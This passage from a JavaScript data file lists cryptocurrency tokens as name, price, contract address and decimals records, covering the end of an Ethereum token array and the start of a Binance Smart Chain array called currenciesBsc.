    "address": "0x7995ab36bb307afa6a683c24a25d90dc1ea83566",
    "decimals": "6"
}, {
    "name": "STK (STK)",
    "price": "0.00022985",
    "address": "0xae73b38d1c9a8b274127ec30160a4927c4d71824",
    "decimals": "18"
}, {
    "name": "WINGS (WINGS)",
    "price": "0.00349445",
    "address": "0x667088b212ce3d06a1b553a7221E1fD19000d9aF",
    "decimals": "18"
}, {
    "name": "Chroma (CHR)",
    "price": "0.163097",
    "address": "0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2",
    "decimals": "6"
}, {
    "name": "Upfiring (UFR)",
    "price": "0.03112443",
    "address": "0xea097a2b1db00627b2fa17460ad260c016016977",
    "decimals": "18"
}, {
    "name": "CUBE (AUTO)",
    "price": "0.107595",
    "address": "0x622dFfCc4e83C64ba959530A5a5580687a57581b",
    "decimals": "18"
}, {
    "name": "QunQunCommunities (QUN)",
    "price": "0.00630932",
    "address": "0x264dc2dedcdcbb897561a57cba5085ca416fb7b4",
    "decimals": "18"
}, {
    "name": "QChi (QCH)",
    "price": "0.00805495",
    "address": "0x687bfc3e73f6af55f0ccca8450114d107e781a0e",
    "decimals": "18"
}, {
    "name": "AppCoins (APPC)",
    "price": "0.00126608",
    "address": "0x1a7a8bd9106f2b8d977e08582dc7d24c723ab0db",
    "decimals": "18"
}, {
    "name": "Hero Origen (HERO)",
    "price": "0.02905054",
    "address": "0x02585e4a14da274d02df09b222d4606b10a4e940",
    "decimals": "18"
}, {
    "name": "InnovaMinex (MINX)",
    "price": "0.04005953",
    "address": "0xae353daeed8dcc7a9a12027f7e070c0a50b7b6a4",
    "decimals": "6"
}, {
    "name": "Enigma (ENG)",
    "price": "0.00973922",
    "address": "0xf0ee6b27b759c9893ce4f094b49ad28fd15a23e4",
    "decimals": "8"
}, {
    "name": "BarnBridge Governance Token (BOND)",
    "price": "5.22",
    "address": "0x0391D2021f89DC339F60Fff84546EA23E337750f",
    "decimals": "18"
}, {
    "name": "Sapien Network (SPN)",
    "price": "0.00029381",
    "address": "0x20f7a3ddf244dc9299975b4da1c39f8d5d75f05a",
    "decimals": "6"
}, {
    "name": "Clover (CLV)",
    "price": "0.083787",
    "address": "0x80c62fe4487e1351b47ba49809ebd60ed085bf52",
    "decimals": "18"
}, {
    "name": "Scanetchain (SWC)",
    "price": "0.00000384",
    "address": "0xadf8b8050639b6236915f7516d69de714672f0bf",
    "decimals": "18"
}, {
    "name": "HASHGARD (GARD)",
    "price": "0.00002992",
    "address": "0x5c64031c62061865e5fd0f53d3cdaef80f72e99d",
    "decimals": "18"
}, {
    "name": "Mask Network (MASK)",
    "price": "1.18",
    "address": "0x69af81e73a73b40adf4f3d4223cd9b1ece623074",
    "decimals": "18"
}, {
    "name": "VIB (VIB)",
    "price": "0.074043",
    "address": "0x2C974B2d0BA1716E644c1FC59982a89DDD2fF724",
    "decimals": "18"
}, {
    "name": "HelloGold (HGT)",
    "price": "0.00016049",
    "address": "0xba2184520a1cc49a6159c57e61e1844e085615b6",
    "decimals": "8"
}, {
    "name": "Exeedme (XED)",
    "price": "0.064813",
    "address": "0xee573a945b01b788b9287ce062a0cfc15be9fd86",
    "decimals": "18"
}, {
    "name": "Ultiledger (ULT)",
    "price": "0.00946795",
    "address": "0xe884cc2795b9c45beeac0607da9539fd571ccf85",
    "decimals": "18"
}, {
    "name": "Serum (SRM)",
    "price": "0.791082",
    "address": "0x476c5E26a75bd202a9683ffD34359C0CC15be0fF",
    "decimals": "6"
}, {
    "name": "Injective Token (INJ)",
    "price": "1.89",
    "address": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
    "decimals": "18"
}, {
    "name": "Smart MFG (MFG)",
    "price": "0.00577594",
    "address": "0x6710c63432a2de02954fc0f851db07146a6c0312",
    "decimals": "18"
}, {
    "name": "Rocket Pool (RPL)",
    "price": "25.13",
    "address": "0xb4efd85c19999d84251304bda99e90b92300bd93",
    "decimals": "18"
}, {
    "name": "AIOZ Network (AIOZ)",
    "price": "0.050446",
    "address": "0x626e8036deb333b408be468f951bdb42433cbf18",
    "decimals": "18"
}, {
    "name": "UnikoinGold (UKG)",
    "price": "0.00059621",
    "address": "0x24692791bc444c5cd0b81e3cbcaba4b04acd1f3b",
    "decimals": "18"
}, {
    "name": "Gemini dollar (GUSD)",
    "price": "0.999773",
    "address": "0x056fd409e1d7a124bd7017459dfea2f387b6d5cd",
    "decimals": "2"
}, {
    "name": "Fractal Protocol Token (FCL)",
    "price": "0.02200073",
    "address": "0xf4d861575ecc9493420a3f5a14f85b13f0b50eb3",
    "decimals": "18"
}, {
    "name": "onG (ONG)",
    "price": "0.00368689",
    "address": "0xd341d1680eeee3255b8c4c75bcce7eb57f144dae",
    "decimals": "18"
}, {
    "name": "Rupiah Token (IDRT)",
    "price": "0.00006552",
    "address": "0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A",
    "decimals": "2"
}, {
    "name": "Frax Share (FXS)",
    "price": "4.78",
    "address": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
    "decimals": "18"
}, {
    "name": "Uquid Coin (UQC)",
    "price": "11.29",
    "address": "0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2",
    "decimals": "18"
}, {
    "name": "TE-FOOD/TustChain (TONE)",
    "price": "0.01517217",
    "address": "0x2Ab6Bb8408ca3199B8Fa6C92d5b455F820Af03c4",
    "decimals": "18"
}, {
    "name": "Jigstack (STAK)",
    "price": "0.00066825",
    "address": "0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13",
    "decimals": "18"
}, {
    "name": "QuarkChain Token (QKC)",
    "price": "0.01088076",
    "address": "0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664",
    "decimals": "18"
}, {
    "name": "Frontier Token (FRONT)",
    "price": "0.233069",
    "address": "0xf8C3527CC04340b208C854E985240c02F7B7793f",
    "decimals": "18"
}, {
    "name": "Fusion (FSN)",
    "price": "0.22636149",
    "address": "0xd0352a019e9ab9d757776f532377aaebd36fd541",
    "decimals": "18"
}, {
    "name": "Block-Chain.com Token (BC)",
    "price": "0.01977315",
    "address": "0x2ecb13a8c458c379c4d9a7259e202de03c8f3d19",
    "decimals": "18"
}, {
    "name": "HUSD (HUSD)",
    "price": "0.990647",
    "address": "0xdf574c24545e5ffecb9a659c229253d4111d87e1",
    "decimals": "8"
}, {
    "name": "DAEX Token (DAX)",
    "price": "0.00348043",
    "address": "0x0b4bdc478791897274652dc15ef5c135cae61e60",
    "decimals": "18"
}, {
    "name": "pNetwork Token (PNT)",
    "price": "0.238358",
    "address": "0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD",
    "decimals": "18"
}, {
    "name": "DOS Network Token (DOS)",
    "price": "0.0015438",
    "address": "0x0A913beaD80F321E7Ac35285Ee10d9d922659cB7",
    "decimals": "18"
}, {
    "name": "Lunyr (LUN)",
    "price": "0.02541296",
    "address": "0xfa05A73FfE78ef8f1a739473e462c54bae6567D9",
    "decimals": "18"
}, {
    "name": "OCC (OCC)",
    "price": "0.279437",
    "address": "0x2f109021afe75b949429fe30523ee7c0d5b27207",
    "decimals": "18"
}, {
    "name": "Meta (MTA)",
    "price": "0.111422",
    "address": "0xa3BeD4E1c75D00fa6f4E5E6922DB7261B5E9AcD2",
    "decimals": "18"
}, {
    "name": "Delta (DLT)",
    "price": "0.00082811",
    "address": "0x07e3c70653548b04f0a75970c1f81b4cbbfb606f",
    "decimals": "18"
}, {
    "name": "Blockport (BPT)",
    "price": "0.189602",
    "address": "0x327682779bab2bf4d1337e8974ab9de8275a7ca8",
    "decimals": "18"
}, {
    "name": "WABnetwork (WAB)",
    "price": "0.00001364",
    "address": "0x4bbbc57af270138ef2ff2c50dbfad684e9e0e604",
    "decimals": "18"
}, {
    "name": "Pinakion (PNK)",
    "price": "0.03369531",
    "address": "0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d",
    "decimals": "18"
}, {
    "name": "AlphaToken (ALPHA)",
    "price": "0.114353",
    "address": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
    "decimals": "18"
}, {
    "name": "Pluton (PLU)",
    "price": "8.45",
    "address": "0xD8912C10681D8B21Fd3742244f44658dBA12264E",
    "decimals": "18"
}, {
    "name": "STAKE (STAKE)",
    "price": "1.40",
    "address": "0x0Ae055097C6d159879521C384F1D2123D1f195e6",
    "decimals": "18"
}, {
    "name": "FuzeX (FXT)",
    "price": "0.00007688",
    "address": "0x1829aa045e21e0d59580024a951db48096e01782",
    "decimals": "18"
}, {
    "name": "Convergence (CONV)",
    "price": "0.00083112",
    "address": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
    "decimals": "18"
}, {
    "name": "Darwinia Network Native Token (RING)",
    "price": "0.00581623",
    "address": "0x9469d013805bffb7d3debe5e7839237e535ec483",
    "decimals": "18"
}, {
    "name": "DSLA (DSLA)",
    "price": "0.00068354",
    "address": "0x3affcca64c2a6f4e3b6bd9c64cd2c969efd1ecbe",
    "decimals": "18"
}, {
    "name": "Monetha (MTH)",
    "price": "0.00893039",
    "address": "0xaf4dce16da2877f8c9e00544c93b62ac40631f16",
    "decimals": "5"
}, {
    "name": "Reputation (REPv2)",
    "price": "7.10748988",
    "address": "0x221657776846890989a759ba2973e427dff5c9bb",
    "decimals": "18"
}, {
    "name": "Hegic (HEGIC)",
    "price": "0.00732306",
    "address": "0x584bC13c7D411c00c01A62e8019472dE68768430",
    "decimals": "18"
}, {
    "name": "BetProtocolToken (BEPRO)",
    "price": "0.00118496",
    "address": "0xcf3c8be2e2c42331da80ef210e9b1b307c03d36a",
    "decimals": "18"
}, {
    "name": "KEEP Token (KEEP)",
    "price": "0.142952",
    "address": "0x85eee30c52b0b379b046fb0f85f4f3dc3009afec",
    "decimals": "18"
}, {
    "name": "DomRaiderToken (DRT)",
    "price": "0.00040019",
    "address": "0x9af4f26941677c706cfecf6d3379ff01bb85d5ab",
    "decimals": "8"
}, {
    "name": "VesperToken (VSP)",
    "price": "0.42878",
    "address": "0x1b40183efb4dd766f11bda7a7c3ad8982e998421",
    "decimals": "18"
}, {
    "name": "BitMartToken (BMC)",
    "price": "0.179249",
    "address": "0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8",
    "decimals": "18"
}, {
    "name": "CPChain (CPC)",
    "price": "0.00308321",
    "address": "0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090",
    "decimals": "18"
}, {
    "name": "Genesis Vision (GVT)",
    "price": "0.226349",
    "address": "0x103c3A209da59d3E7C4A89307e66521e081CFDF0",
    "decimals": "18"
}, {
    "name": "Herocoin (PLAY)",
    "price": "0.00653801",
    "address": "0xe477292f1b3268687a29376116b0ed27a9c76170",
    "decimals": "18"
}, {
    "name": "ZINC (ZINC)",
    "price": "0.00085128",
    "address": "0x4aac461c86abfa71e9d00d9a2cde8d74e4e1aeea",
    "decimals": "18"
}, {
    "name": "Boba Token (BOBA)",
    "price": "0.291478",
    "address": "0x42bbfa2e77757c645eeaad1655e0911a7553efbc",
    "decimals": "18"
}, {
    "name": "PoolTogether (POOL)",
    "price": "0.817698",
    "address": "0x0cec1a9154ff802e7934fc916ed7ca50bde6844e",
    "decimals": "18"
}, {
    "name": "TORN Token (TORN)",
    "price": "6.50",
    "address": "0x77777feddddffc19ff86db637967013e6c6a116c",
    "decimals": "18"
}, {
    "name": "Lamden Tau (TAU)",
    "price": "0.01905956",
    "address": "0xc27a2f05fa577a83ba0fdb4c38443c0718356501",
    "decimals": "18"
}, {
    "name": "Lancer Token (LNC)",
    "price": "0.00050732",
    "address": "0x63e634330a20150dbb61b15648bc73855d6ccf07",
    "decimals": "18"
}, {
    "name": "DGD (DGD)",
    "price": "0.00000045",
    "address": "0xe0b7927c4af23765cb51314a0e0521a9645f0e2a",
    "decimals": "9"
}, {
    "name": "Energy Web Token Bridged (EWTB)",
    "price": "4.00480304",
    "address": "0x178c820f862b14f316509ec36b13123da19a6054",
    "decimals": "18"
}, {
    "name": "DataWallet (DXT)",
    "price": "0.00014378",
    "address": "0x8db54ca569d3019a2ba126d03c37c44b5ef81ef6",
    "decimals": "8"
}, {
    "name": "Chi Gastoken by 1inch (CHI)",
    "price": "0.02448606",
    "address": "0x0000000000004946c0e9F43F4Dee607b0eF1fA1c",
    "decimals": "0"
}, {
    "name": "Marlin POND (POND)",
    "price": "0.01066292",
    "address": "0x57b946008913b82e4df85f501cbaed910e58d26c",
    "decimals": "18"
}, {
    "name": "Oraichain Token (ORAI)",
    "price": "1.48",
    "address": "0x4c11249814f11b9346808179cf06e71ac328c1b5",
    "decimals": "18"
}, {
    "name": "BLOCKv (VEE)",
    "price": "0.00186067",
    "address": "0x340d2bde5eb28c1eed91b2f790723e3b160613b7",
    "decimals": "18"
}, {
    "name": "Zebi Coin (ZCO)",
    "price": "0.00023122",
    "address": "0x2008e3057bd734e10ad13c9eae45ff132abc1722",
    "decimals": "8"
}, {
    "name": "Trustcoin (TRST)",
    "price": "0.00164434",
    "address": "0xcb94be6f13a1182e4a4b6140cb7bf2025d28e41b",
    "decimals": "6"
}, {
    "name": "DivergenceProtocol (DIVER)",
    "price": "0.01676029",
    "address": "0xfb782396c9b20e564a64896181c7ac8d8979d5f4",
    "decimals": "18"
}, {
    "name": "XMED Chain Token (XMCT)",
    "price": "0.00009998",
    "address": "0x44449Fa4d607F807d1eD4a69ad942971728391C8",
    "decimals": "18"
}, {
    "name": "0xBitcoin Token (0xBTC)",
    "price": "0.148909",
    "address": "0xb6ed7644c69416d67b522e20bc294a9a9b405b31",
    "decimals": "8"
}, {
    "name": "Everex (EVX)",
    "price": "0.01145348",
    "address": "0xf3db5fa2c66b7af3eb0c0b782510816cbe4813b8",
    "decimals": "4"
}, {
    "name": "GoBlank Token (BLANK)",
    "price": "0.050756",
    "address": "0x41a3dba3d677e573636ba691a70ff2d606c29666",
    "decimals": "18"
}, {
    "name": "4NEW (KWATT)",
    "price": "0.00032519",
    "address": "0x241ba672574a78a3a604cdd0a94429a73a84a324",
    "decimals": "18"
}, {
    "name": "Bethereum (BETHER)",
    "price": "0.00018628",
    "address": "0x14c926f2290044b647e1bf2072e67b495eff1905",
    "decimals": "18"
}, {
    "name": "Launchpool token (LPOOL)",
    "price": "0.11571",
    "address": "0x6149c26cd2f7b5ccdb32029af817123f6e37df5b",
    "decimals": "18"
}, {
    "name": "PRG (PRG)",
    "price": "0.00284844",
    "address": "0x7728dFEF5aBd468669EB7f9b48A7f70a501eD29D",
    "decimals": "6"
}, {
    "name": "Edgeless (EDG)",
    "price": "0.04071584",
    "address": "0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c",
    "decimals": "0"
}, {
    "name": "DAOstack (GEN)",
    "price": "0.00964484",
    "address": "0x543ff227f64aa17ea132bf9886cab5db55dcaddf",
    "decimals": "18"
}, {
    "name": "Chain (XCN)",
    "price": "0.071562",
    "address": "0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18",
    "decimals": "18"
}, {
    "name": "Niobium (NBC)",
    "price": "0.00193755",
    "address": "0x9f195617fa8fbad9540c5d113a99a0a0172aaedc",
    "decimals": "18"
}, {
    "name": "CAPP Token (CAPP)",
    "price": "0.00041457",
    "address": "0x11613b1f840bb5A40F8866d857e24DA126B79D73",
    "decimals": "2"
}, {
    "name": "RHOC (RHOC)",
    "price": "0.00397648",
    "address": "0x168296bb09e24a88805cb9c33356536b980d3fc5",
    "decimals": "8"
}, {
    "name": "Covesting (COV)",
    "price": "0.228071",
    "address": "0xADA86b1b313D1D5267E3FC0bB303f0A2b66D0Ea7",
    "decimals": "18"
}, {
    "name": "Mobile Integrated Blockchain (MIB)",
    "price": "0.00059939",
    "address": "0x146d8d942048ad517479c9bab1788712af180fde",
    "decimals": "18"
}, {
    "name": "Decentr (DEC)",
    "price": "0.01765735",
    "address": "0x30f271C9E86D2B7d00a6376Cd96A1cFBD5F0b9b3",
    "decimals": "18"
}, {
    "name": "iQeon (IQN)",
    "price": "0.292778",
    "address": "0x0db8d8b76bc361bacbb72e2c491e06085a97ab31",
    "decimals": "18"
}, {
    "name": "MedToken (MTN)",
    "price": "0.00226169",
    "address": "0x41dbecc1cdc5517c6f76f6a6e836adbee2754de3",
    "decimals": "18"
}, {
    "name": "Dejitaru Tsuka (TSUKA)",
    "price": "0.118297",
    "address": "0xc5fb36dd2fb59d3b98deff88425a3f425ee469ed",
    "decimals": "9"
}, {
    "name": "AltEstate token (ALT)",
    "price": "0.0001204",
    "address": "0x419b8ed155180a8c9c64145e76dad49c0a4efb97",
    "decimals": "18"
}, {
    "name": "Okschain Token (OKS)",
    "price": "0.0000186",
    "address": "0x7b68d272eda2185ea2f9283f241b1c44c51e712a",
    "decimals": "18"
}, {
    "name": "RvT (RVT)",
    "price": "0.01978129",
    "address": "0x3d1ba9be9f66b8ee101911bc36d3fb562eac2244",
    "decimals": "18"
}, {
    "name": "Rubic (RBC)",
    "price": "0.07828",
    "address": "0xa4eed63db85311e22df4473f87ccfc3dadcfa3e3",
    "decimals": "18"
}, {
    "name": "MANTRA DAO (OM)",
    "price": "0.04280801",
    "address": "0x3593d125a4f7849a1b059e64f4517a86dd60c95d",
    "decimals": "18"
}, {
    "name": "Berry (BERRY)",
    "price": "0.00027009",
    "address": "0x6aeb95f06cda84ca345c2de0f3b7f96923a44f4c",
    "decimals": "14"
}, {
    "name": "Orbs (ORBS)",
    "price": "0.03510644",
    "address": "0xff56cc6b1e6ded347aa0b7676c85ab0b3d08b0fa",
    "decimals": "18"
}, {
    "name": "IPC (IPC)",
    "price": "0.00050218",
    "address": "0x622cd54deb2bb7a051515192417109bcf3fe098f",
    "decimals": "8"
}, {
    "name": "Reserve Rights (RSR)",
    "price": "0.00912251",
    "address": "0x320623b8e4ff03373931769a31fc52a4e78b5d70",
    "decimals": "18"
}, {
    "name": "HyperQuant Token (HQT)",
    "price": "0.00000745",
    "address": "0x3e1d5a855ad9d948373ae68e4fe1f094612b1322",
    "decimals": "18"
}, {
    "name": "Nectar (NCT)",
    "price": "0.00929087",
    "address": "0x9e46a38f5daabe8683e10793b06749eef7d733d1",
    "decimals": "18"
}, {
    "name": "Spheroid (SPH)",
    "price": "0.01031086",
    "address": "0xa0cf46eb152656c7090e769916eb44a138aaa406",
    "decimals": "18"
}, {
    "name": "Frax (FRAX)",
    "price": "0.999673",
    "address": "0x853d955acef822db058eb8505911ed77f175b99e",
    "decimals": "18"
}, {
    "name": "Monolith (TKN)",
    "price": "0.069661",
    "address": "0xaaaf91d9b90df800df4f55c205fd6989c977e73a",
    "decimals": "8"
}, {
    "name": "Traxia Membership Token (TMT)",
    "price": "0.00002475",
    "address": "0x3209f98bebf0149b769ce26d71f7aea8e435efea",
    "decimals": "18"
}, {
    "name": "Keep3rV1 (KP3R)",
    "price": "98.01",
    "address": "0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44",
    "decimals": "18"
}, {
    "name": "ATLANT (ATL)",
    "price": "0.00991499",
    "address": "0x78b7fada55a64dd895d8c8c35779dd8b67fa8a05",
    "decimals": "18"
}, {
    "name": "Covalent Query Token (CQT)",
    "price": "0.082951",
    "address": "0xd417144312dbf50465b1c641d016962017ef6240",
    "decimals": "18"
}, {
    "name": "Melon Token (MLN)",
    "price": "19.67",
    "address": "0xec67005c4e498ec7f55e092bd1d35cbc47c91892",
    "decimals": "18"
}, {
    "name": "BitBall (BTB)",
    "price": "0.00055121",
    "address": "0x06e0feb0d74106c7ada8497754074d222ec6bcdf",
    "decimals": "18"
}, {
    "name": "Moss Coin (MOC)",
    "price": "0.0808",
    "address": "0x865ec58b06bf6305b886793aa20a2da31d034e68",
    "decimals": "18"
}, {
    "name": "ALICE (ALICE)",
    "price": "1.75",
    "address": "0xac51066d7bec65dc4589368da368b212745d63e8",
    "decimals": "6"
}, {
    "name": "Vibe Coin (VIBE)",
    "price": "0.00299266",
    "address": "0xe8ff5c9c75deb346acac493c463c8950be03dfba",
    "decimals": "18"
}, {
    "name": "StargateToken (STG)",
    "price": "0.526018",
    "address": "0xaf5191b0de278c7286d6c7cc6ab6bb8a73ba2cd6",
    "decimals": "18"
}, {
    "name": "Bezop (Bez)",
    "price": "0.0078565",
    "address": "0x8a1e3930fde1f151471c368fdbb39f3f63a65b55",
    "decimals": "18"
}, {
    "name": "Cardstack (CARD)",
    "price": "0.0015922",
    "address": "0x954b890704693af242613edef1b603825afcd708",
    "decimals": "18"
}, {
    "name": "Adventure Gold (AGLD)",
    "price": "0.34221318",
    "address": "0x32353A6C91143bfd6C7d363B546e62a9A2489A20",
    "decimals": "18"
}, {
    "name": "TrueFi (TRU)",
    "price": "0.051992",
    "address": "0x4c19596f5aaff459fa38b0f7ed92f11ae6543784",
    "decimals": "8"
}, {
    "name": "ICE ROCK MINING (ROCK2)",
    "price": "0.00355791",
    "address": "0xC16b542ff490e01fcc0DC58a60e1EFdc3e357cA6",
    "decimals": "0"
}, {
    "name": "Rari Governance Token (RGT)",
    "price": "2.83025336",
    "address": "0xD291E7a03283640FDc51b121aC401383A46cC623",
    "decimals": "18"
}, {
    "name": "Tidal Token (TIDAL)",
    "price": "0.00032623",
    "address": "0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7",
    "decimals": "18"
}, {
    "name": "UnlimitedIP Token (UIP)",
    "price": "0.00027085",
    "address": "0x4290563c2d7c255b5eec87f2d3bd10389f991d68",
    "decimals": "18"
}, {
    "name": "Fire Lotto (FLOT)",
    "price": "0.00206807",
    "address": "0x049399a6b048d52971f7d122ae21a1532722285f",
    "decimals": "18"
}, {
    "name": "Sentivate (SNTVT)",
    "price": "0.00109525",
    "address": "0x7865af71cf0b288b4e7f654f4f7851eb46a2b7f8",
    "decimals": "18"
}, {
    "name": "OpenANX (OAX)",
    "price": "0.231789",
    "address": "0x701c244b988a513c945973defa05de933b23fe1d",
    "decimals": "18"
}, {
    "name": "Delphy Token (DPY)",
    "price": "0.00555217",
    "address": "0x6c2adc2073994fb2ccc5032cc2906fa221e9b391",
    "decimals": "18"
}, {
    "name": "PolkaFoundry (PKF)",
    "price": "0.121622",
    "address": "0x8b39b70e39aa811b69365398e0aace9bee238aeb",
    "decimals": "18"
}, {
    "name": "Kora Network Token (KNT)",
    "price": "0.00006618",
    "address": "0xff5c25d2f40b47c4a37f989de933e26562ef0ac0",
    "decimals": "16"
}, {
    "name": "Plasma (PPAY)",
    "price": "0.00428323",
    "address": "0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2",
    "decimals": "18"
}, {
    "name": "AMLT (AMLT)",
    "price": "0.00292836",
    "address": "0xca0e7269600d353f70b14ad118a49575455c0f2f",
    "decimals": "18"
}, {
    "name": "Humaniq (HMQ)",
    "price": "0.00455047",
    "address": "0xcbcc0f036ed4788f63fc0fee32873d6a7487b908",
    "decimals": "8"
}, {
    "name": "SPANK (SPANK)",
    "price": "0.00274741",
    "address": "0x42d6622dece394b54999fbd73d108123806f6a18",
    "decimals": "18"
}, {
    "name": "Rating (Rating)",
    "price": "0.00014011",
    "address": "0xe8663a64a96169ff4d95b4299e7ae9a76b905b31",
    "decimals": "8"
}, {
    "name": "VISOR (VISR)",
    "price": "0.00264348",
    "address": "0xf938424f7210f31df2aee3011291b658f872e91e",
    "decimals": "18"
}, {
    "name": "Archetypal Network (ACTP)",
    "price": "0.0000008",
    "address": "0x7b2df125567815ac9b57da04b620f50bc93b320c",
    "decimals": "8"
}, {
    "name": "Wrapped NXM (wNXM)",
    "price": "15.86",
    "address": "0x0d438f3b5175bebc262bf23753c1e53d03432bde",
    "decimals": "18"
}, {
    "name": "EXRP Network (EXRN)",
    "price": "0.00000573",
    "address": "0xe469c4473af82217b30cf17b10bcdb6c8c796e75",
    "decimals": "0"
}, {
    "name": "Function X (FX)",
    "price": "0.24072737",
    "address": "0x8c15ef5b4b21951d50e53e4fbda8298ffad25057",
    "decimals": "18"
}, {
    "name": "InsurAce (INSUR)",
    "price": "0.104686",
    "address": "0x544c42fbb96b39b21df61cf322b5edc285ee7429",
    "decimals": "18"
}, {
    "name": "Streamity (STM)",
    "price": "0.01130501",
    "address": "0x0e22734e078d6e399bcee40a549db591c4ea46cb",
    "decimals": "18"
}, {
    "name": "AdBank (ADB)",
    "price": "0.00044531",
    "address": "0x2baac9330cf9ac479d819195794d79ad0c7616e3",
    "decimals": "18"
}, {
    "name": "ZAP TOKEN (ZAP)",
    "price": "0.00349742",
    "address": "0x6781a0f84c7e9e846dcb84a9a5bd49333067b104",
    "decimals": "18"
}, {
    "name": "DOVU (DOV)",
    "price": "0.00317075",
    "address": "0xac3211a5025414af2866ff09c23fc18bc97e79b1",
    "decimals": "18"
}, {
    "name": "UniLend Finance Token (UFT)",
    "price": "0.363599",
    "address": "0x0202Be363B8a4820f3F4DE7FaF5224fF05943AB1",
    "decimals": "18"
}];
const currenciesBsc = [{
    "name": "Binance-Peg Ethereum Token (ETH)",
    "price": "1358.24923787",
    "address": "0x2170ed0880ac9a755fd29b2688956bd959f933f8",
    "decimals": "18"
}, {
    "name": "Binance-Peg BSC-USD (BSC-USD)",
    "price": "1.002",
    "address": "0x55d398326f99059ff775485246999027b3197955",
    "decimals": "18"
}, {
    "name": "Wrapped BNB (WBNB)",
    "price": "293.03699101",
    "address": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
    "decimals": "18"
}, {
    "name": "Binance-Peg USD Coin (USDC)",
    "price": "1.00010073",
    "address": "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
    "decimals": "18"
}, {
    "name": "Binance-Peg XRP Token (XRP)",
    "price": "0.4958186",
    "address": "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe",
    "decimals": "18"
}, {
    "name": "Binance-Peg BUSD Token (BUSD)",
    "price": "1.00043074",
    "address": "0xe9e7cea3dedca5984780bafc599bd69add087d56",
    "decimals": "18"
}, {
    "name": "Binance-Peg Cardano Token (ADA)",
    "price": "0.42869056",
    "address": "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47",
    "decimals": "18"
}, {
    "name": "Binance-Peg Dogecoin Token (DOGE)",
    "price": "0.06378869",
    "address": "0xba2ae424d960c26247dd6c32edc70b295c744c43",
    "decimals": "8"
}, {
    "name": "Binance-Peg Polkadot Token (DOT)",
    "price": "6.37164668",
    "address": "0x7083609fce4d1d8dc0c979aab8c869ea2c873402",
    "decimals": "18"
}, {
    "name": "Binance-Peg Dai Token (DAI)",
    "price": "0.99957331",
    "address": "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
    "decimals": "18"
}, {
    "name": "Matic Token (MATIC)",
    "price": "0.842514",
    "address": "0xcc42724c6683b7e57334c4e856f4c9965ed682bd",
    "decimals": "18"
}, {
    "name": "Binance-Peg SHIBA INU Token (SHIB)",
    "price": "0.00001127",
    "address": "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
    "decimals": "18"
}, {
    "name": "Binance-Peg Uniswap (UNI)",
    "price": "6.87546476",
    "address": "0xbf5140a22578168fd562dccf235e5d43a02ce9b1",
    "decimals": "18"
}, {
    "name": "Binance-Peg Avalanche Token (AVAX)",
    "price": "17.14666325",
    "address": "0x1ce0c2827e2ef14d5c4f29a091d735a204794041",
    "decimals": "18"
}, {
    "name": "Binance-Peg Litecoin Token (LTC)",
    "price": "54.01931051",
    "address": "0x4338665cbb7b2485a8855a139b75d5e34ab0db94",
    "decimals": "18"
}, {
    "name": "Binance-Peg Ethereum Classic (ETC)",
    "price": "27.92451199",
    "address": "0x3d6545b08693dae087e957cb1180ee38b9e3c25e",
    "decimals": "18"
}, {
    "name": "Binance-Peg ChainLink Token (LINK)",
    "price": "7.72018768",
    "address": "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd",
    "decimals": "18"
}, {
    "name": "Binance-Peg Cosmos Token (ATOM)",
    "price": "13.15524018",
    "address": "0x0eb3a705fc54725037cc9e008bdede697f62f335",
    "decimals": "18"
}, {
    "name": "Binance-Peg NEAR Protocol (NEAR)",
    "price": "3.64546638",
    "address": "0x1fa4a73a3f0133f0025378af00236f3abdee5d63",
    "decimals": "18"
}, {
    "name": "Binance-Peg BitTorrent Token (BTT)",
    "price": "0.00269639",
    "address": "0x8595f9da7b868b1822194faed312235e43007b49",
    "decimals": "18"
}, {
    "name": "Binance-Peg Bitcoin Cash Token (BCH)",
    "price": "120.22867839",
    "address": "0x8ff795a6f4d97e7887c79bea79aba5cc76444adf",
    "decimals": "18"
}, {
    "name": "Binance-Peg BTCB Token (BTCB)",
    "price": "20,055.37019218",
    "address": "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c",
    "decimals": "18"
}, {
    "name": "Binance-Peg FLOW Token (FLOW)",
    "price": "1.70",
    "address": "0xc943c5320b9c18c153d1e2d12cc3074bebfb31a2",
    "decimals": "18"
}, {
    "name": "Chain (XCN)",
    "price": "0.070595",
    "address": "0x7324c7c0d95cebc73eea7e85cbaac0dbdf88a05b",
    "decimals": "18"
}, {
    "name": "Frax (FRAX)",
    "price": "1.002",
    "address": "0x90c97f71e18723b0cf0dfa30ee176ab653e89f40",
    "decimals": "18"
}, {
    "name": "Binance-Peg Tezos Token (XTZ)",
    "price": "1.43075188",
    "address": "0x16939ef78684453bfdfb47825f8a5f714f12623a",
    "decimals": "18"
}, {
    "name": "Binance-Peg Elrond Token (EGLD)",
    "price": "54.79471053",
    "address": "0xbf7c81fff98bbe61b40ed186e4afd6ddd01337fe",
    "decimals": "18"
}, {
    "name": "Binance-Peg EOS Token (EOS)",
    "price": "1.17087537",
    "address": "0x56b6fb708fc5732dec1afc8d8556423a2edccbd6",
    "decimals": "18"
}, {
    "name": "Binance-Peg Axie Infinity Shard Token (AXS)",
    "price": "12.74",
